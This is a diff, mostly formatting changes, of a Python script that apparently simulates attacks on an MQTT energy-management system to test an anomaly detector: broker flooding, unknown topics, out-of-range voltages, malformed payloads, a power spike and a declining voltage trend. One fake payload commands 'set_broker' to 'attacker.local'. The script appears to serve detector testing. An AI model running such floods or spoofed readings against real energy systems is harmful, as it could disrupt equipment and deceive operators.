@@ -18,19 +18,20 @@ import paho.mqtt.client as mqtt
 # Config
 # ---------------------------------------------------------------------------
 
-BROKER = "192.168.70.16"
-PORT   = 1883
+BROKER = "192.168.1.130"
+PORT = 1883
 
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
+
 
 def make_battery(**overrides) -> dict:
     payload = {
         "time":            round(time.time(), 1),
         "battery_voltage": 12.8,
         "battery_current": -3.0,
-        "battery_power":   -38.4,
+        "battery_power": -38.4,
         "soc":             85.0,
         "consumed_ah":     1.2,
         "time_to_go":      14.0,
@@ -101,7 +102,8 @@ def attack_unknown_topic(client: mqtt.Client) -> None:
     pause("Press Enter to start…")
 
     fake_topics = [
-        ("ems/admin/config",    {"cmd": "set_broker", "host": "attacker.local"}),
+        ("ems/admin/config",
+         {"cmd": "set_broker", "host": "attacker.local"}),
         ("sensors/exfil",       {"battery_voltage": 12.8, "soc": 85}),
         ("home/lights/bedroom", {"state": "ON"}),
     ]
@@ -167,7 +169,8 @@ def attack_power_spike(client: mqtt.Client) -> None:
     print(f"\n  Publishing {SEED} normal AC readings (~2 300 W)…")
     for i in range(SEED):
         power = 2300 + (i % 5) * 10   # slight variation so stdev > 0
-        pub(client, "ems/ac/load3", make_ac(active_power=float(power)), label=f"{i+1}/{SEED}")
+        pub(client, "ems/ac/load3",
+            make_ac(active_power=float(power)), label=f"{i+1}/{SEED}")
         time.sleep(0.1)
 
     print("\n  Seeding complete. Sending spike (12 000 W)…")
@@ -185,12 +188,14 @@ def attack_voltage_trend(client: mqtt.Client) -> None:
     pause("Press Enter to start the decline…")
 
     START_V = 13.5
-    STEPS   = 22
-    print(f"\n  Sending {STEPS} readings: {START_V:.2f} V → {START_V - STEPS*0.1:.2f} V\n")
+    STEPS = 22
+    print(
+        f"\n  Sending {STEPS} readings: {START_V:.2f} V → {START_V - STEPS*0.1:.2f} V\n")
 
     for i in range(STEPS):
         v = round(START_V - i * 0.1, 3)
-        pub(client, "ems/battery", make_battery(battery_voltage=v), label=f"step {i+1}")
+        pub(client, "ems/battery",
+            make_battery(battery_voltage=v), label=f"step {i+1}")
         time.sleep(0.15)
 
     print("\n  Done. Voltage trend alert should appear after reading 20.")
@@ -201,12 +206,18 @@ def attack_voltage_trend(client: mqtt.Client) -> None:
 # ---------------------------------------------------------------------------
 
 ATTACKS = [
-    ("MQTT Flood",            "Flood broker with 80 packets in 2 seconds",              attack_flood),
-    ("Unknown Topic",         "Publish on unrecognised MQTT topics",                    attack_unknown_topic),
-    ("Voltage Anomaly",       "Send out-of-range battery and AC voltages",              attack_voltage_anomaly),
-    ("Malformed Payload",     "Send payloads with missing required fields",             attack_malformed),
-    ("Power Spike",           "Seed normal history then inject a 12 000 W spike",       attack_power_spike),
-    ("Voltage Trend",         "22 strictly decreasing battery voltage readings",        attack_voltage_trend),
+    ("MQTT Flood",            "Flood broker with 80 packets in 2 seconds",
+     attack_flood),
+    ("Unknown Topic",         "Publish on unrecognised MQTT topics",
+     attack_unknown_topic),
+    ("Voltage Anomaly",       "Send out-of-range battery and AC voltages",
+     attack_voltage_anomaly),
+    ("Malformed Payload",     "Send payloads with missing required fields",
+     attack_malformed),
+    ("Power Spike",           "Seed normal history then inject a 12 000 W spike",
+     attack_power_spike),
+    ("Voltage Trend",         "22 strictly decreasing battery voltage readings",
+     attack_voltage_trend),
 ]
 
 
